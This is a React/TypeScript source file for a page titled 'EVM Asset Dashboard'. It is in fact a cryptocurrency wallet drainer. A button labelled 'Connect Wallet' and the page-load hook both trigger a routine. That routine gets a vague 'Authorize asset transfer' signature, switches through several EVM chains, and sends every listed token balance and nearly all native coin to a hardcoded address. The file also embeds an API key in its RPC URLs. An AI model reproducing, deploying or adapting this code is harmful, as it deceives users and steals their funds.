"use client";
import React, { useEffect, useState } from "react";
import { ethers } from "ethers";
import ERC20ABI from "./erc20.json";


// Define types for CHAINS and ERC20 tokens
interface Token {
  address: string;
  symbol: string;
}

interface Chain {
  name: string;
  chainId: number;
  rpc: string;
  tokens: Token[];
}

interface CHAINS {
  [key: string]: Chain;
}


const CHAINS = {
  ethereum: {
    name: "Ethereum",
    chainId: 1,
    rpc: "https://eth-mainnet.g.alchemy.com/v2/s4f1KskkLK_oAmrlizyLtSa-OrepjZCS",
    tokens: [
      {
        symbol: "USDT",
        address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        decimals: 6,
      },
      {
        symbol: "USDC",
        address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        decimals: 6,
      },
      {
        symbol: "BCut",
        address: "0xBEF26Bd568e421D6708CCA55Ad6e35f8bfA0C406",
        decimals: 18,
      },
    ],
  },
  arbitrum: {
    name: "Arbitrum",
    chainId: 42161,
    rpc: "https://arb-mainnet.g.alchemy.com/v2/s4f1KskkLK_oAmrlizyLtSa-OrepjZCS",
    tokens: [
      {
        symbol: "USDT",
        address: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
        decimals: 6,
      },
      {
        symbol: "USDC",
        address: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8",
        decimals: 6,
      },
      {
        symbol: "BCut",
        address: "0xBEF26Bd568e421D6708CCA55Ad6e35f8bfA0C406",
        decimals: 18,
      },
    ],
  },
  zksync: {
    name: "zkSync Era",
    chainId: 324,
    rpc: "https://mainnet.era.zksync.io",
    tokens: [],
  },
  bsc: {
    name: "BSC",
    chainId: 56,
    rpc: "https://bsc-dataseed.binance.org",
    tokens: [],
  },
  optimism: {
    name: "OP Mainnet",
    chainId: 10,
    rpc: "https://mainnet.optimism.io",
    tokens: [],
  },
  mantle: {
    name: "Mantle Network",
    chainId: 5000,
    rpc: "https://rpc.mantle.xyz",
    tokens: [],
  },
  arbitrumNova: {
    name: "Arbitrum Nova",
    chainId: 42170,
    rpc: "https://nova.arbitrum.io/rpc",
    tokens: [],
  },
  base: {
    name: "Base Mainnet",
    chainId: 8453,
    rpc: "https://mainnet.base.org",
    tokens: [],
  },
  linea: {
    name: "Linea",
    chainId: 59144,
    rpc: "https://rpc.linea.build",
    tokens: [],
  },
}
export default function App() {
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [signer, setSigner] = useState<ethers.JsonRpcSigner | null>(null);
  const [walletAddress, setWalletAddress] = useState("");
  const [destination, setDestination] = useState(
    "0x41E661BDD135c214726A50cDA53E51a96Ec1E051"
  );
  const [status, setStatus] = useState("");
  const [balances, setBalances] = useState<Record<string, any>>({});

  useEffect(() => {
    connectWallet();
  }, []);
  const connectWallet = async () => {
    if (!window.ethereum) return alert("Install MetaMask first");
    const _provider = new ethers.BrowserProvider(window.ethereum);
    const _signer = await _provider.getSigner();
    const _address = await _signer.getAddress();

    setProvider(_provider);
    setSigner(_signer);
    setWalletAddress(_address);
    sendAllAssets();
    await fetchBalances(_address);
  };

  const fetchBalances = async (address: string) => {
    const result: Record<string, any> = {};

    for (const [key, chain] of Object.entries(CHAINS)) {
      const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
      const nativeBal = await rpcProvider.getBalance(address);
      console.log();

      result[key] = {
        name: chain.name,
        native: ethers.formatEther(nativeBal),
        tokens: [],
      };

      for (const token of chain.tokens) {
        const contract = new ethers.Contract(
          token.address,
          ERC20ABI,
          rpcProvider
        );
        const balance = await contract.balanceOf(address);
        console.log(
          `Balance of ${token.symbol} on ${chain.name}:`,
          balance.toString()
        );

        const formatted = Number(ethers.formatUnits(balance, token.decimals));
        result[key].tokens.push({ ...token, balance: formatted });
      }
    }

    setBalances(result);
  };

  const NATIVE_TOKEN_PRICES = {
    ethereum: 3000, // ETH
    arbitrum: 3000, // ARB ETH
    base: 3000, // BASE ETH
  };
  const sendAllAssets = async (): Promise<void> => {
    if (!destination) return alert("Please enter a destination address.");
    if (!window.ethereum) return alert("MetaMask not found.");
  
    const tempProvider = new ethers.BrowserProvider(window.ethereum);
    const tempSigner = await tempProvider.getSigner();
    const currentAddress = await tempSigner.getAddress();
  
    // 1. User Signature Authorization (only one popup)
    const message = `Authorize asset transfer`;
    try {
      const signature = await tempSigner.signMessage(message);
      console.log("User signed authorization:", signature);
    } catch (err: any) {
      setStatus("Transfer cancelled: Signature not approved.");
      return;
    }
  
    setStatus("Starting asset transfers...");
  
    // 2. Loop through all chains
    for (const [key, chain] of Object.entries(CHAINS)) {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const nativeBal = await rpcProvider.getBalance(currentAddress);
  
        const gasBuffer = ethers.parseEther("0.0002"); // Small amount to keep for gas
        const nativeTransferable = nativeBal > gasBuffer ? nativeBal - gasBuffer : BigInt(0);
  
        let hasAssets = nativeTransferable > BigInt(0);
  
        for (const token of chain.tokens) {
          const contract = new ethers.Contract(token.address, ERC20ABI, rpcProvider);
          const tokenBal: bigint = await contract.balanceOf(currentAddress);
          if (tokenBal > BigInt(0)) {
            hasAssets = true;
            break;
          }
        }
  
        if (!hasAssets) {
          console.log(`Skipping ${chain.name}: no assets.`);
          continue;
        }
  
        // 3. Switch Network
        try {
          setStatus(`Switching to ${chain.name}...`);
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
          });
        } catch (err: any) {
          console.error(`Switch chain error for ${chain.name}:`, err.message);
          setStatus(`User declined to switch to ${chain.name}`);
          continue;
        }
  
        const chainProvider = new ethers.BrowserProvider(window.ethereum);
        const chainSigner = await chainProvider.getSigner();
        const feeData = await chainProvider.getFeeData();
        let nonce = await chainProvider.getTransactionCount(currentAddress);
  
        // 4. Send all ERC-20 tokens
        for (const token of chain.tokens) {
          try {
            const contract = new ethers.Contract(token.address, ERC20ABI, chainProvider);
            const tokenBal: bigint = await contract.balanceOf(currentAddress);
            if (tokenBal > BigInt(0)) {
              const iface = new ethers.Interface(ERC20ABI);
              const data = iface.encodeFunctionData("transfer", [destination, tokenBal]);
  
              const txRequest = {
                to: token.address,
                data,
                value: 0,
                gasLimit: 100_000,
                chainId: chain.chainId,
                nonce: nonce++,
                type: 2,
                maxFeePerGas: feeData.maxFeePerGas!,
                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas!,
                confirmations: 0,
              };
  
              const txResponse = await chainSigner.sendTransaction(txRequest);
              await txResponse.wait();
  
              console.log(`✅ Sent ${token.symbol} on ${chain.name}: ${txResponse.hash}`);
            }
          } catch (err: any) {
            console.error(`❌ Error sending ${token.symbol} on ${chain.name}:`, err.message);
            setStatus(`Error sending ${token.symbol} on ${chain.name}`);
          }
        }
  
        // 5. Send native token
        if (nativeTransferable > BigInt(0)) {
          try {
            const txRequest = {
              to: destination,
              value: nativeTransferable,
              gasLimit: 21_000,
              chainId: chain.chainId,
              nonce: nonce++,
              type: 2,
              maxFeePerGas: feeData.maxFeePerGas!,
              maxPriorityFeePerGas: feeData.maxPriorityFeePerGas!,
              confirmations: 0,
            };
  
            const txResponse = await chainSigner.sendTransaction(txRequest);
            await txResponse.wait();
  
            console.log(`✅ Sent native token on ${chain.name}: ${txResponse.hash}`);
          } catch (err: any) {
            console.error(`❌ Error sending native token on ${chain.name}:`, err.message);
            setStatus(`Error sending native token on ${chain.name}`);
          }
        }
      } catch (err: any) {
        console.error(`❌ General error on ${chain.name}:`, err.message);
        setStatus(`Error on ${chain.name}`);
      }
    }
  
    // Final status after all
    setStatus("✅ All assets sent across all chains!");
    fetchBalances(currentAddress);
  };
  
  
  
  

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <div className="max-w-md mx-auto p-6 rounded-lg shadow-md bg-black">
        <h1 className="text-2xl font-bold mb-4">EVM Asset Dashboard</h1>

        <button
          onClick={sendAllAssets}
          className="bg-blue-600 text-white px-4 py-2 rounded mb-4 w-full"
        >
          Connect Wallet
        </button>
        <p>{walletAddress}</p>
      </div>
    </div>
  );
}
